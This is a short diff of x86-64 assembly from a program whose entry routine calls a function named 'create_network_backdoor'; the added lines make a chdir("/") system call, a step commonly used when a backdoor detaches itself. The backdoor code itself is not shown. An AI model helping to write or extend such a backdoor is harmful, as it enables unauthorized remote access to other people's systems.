@@ -20,6 +20,11 @@ _start:
 	;create network backdoor
 	call create_network_backdoor
 	;chdir to /
+	push 0x0000002f
+	lea rdi, [rsp]
+	mov rax, 80
+	syscall; chdir("/")
+	add rsp, 8
 ;	mov rax, 80
 ;	xor rdi, rdi
 ;	mov rdi, 0x002f; "t\0"
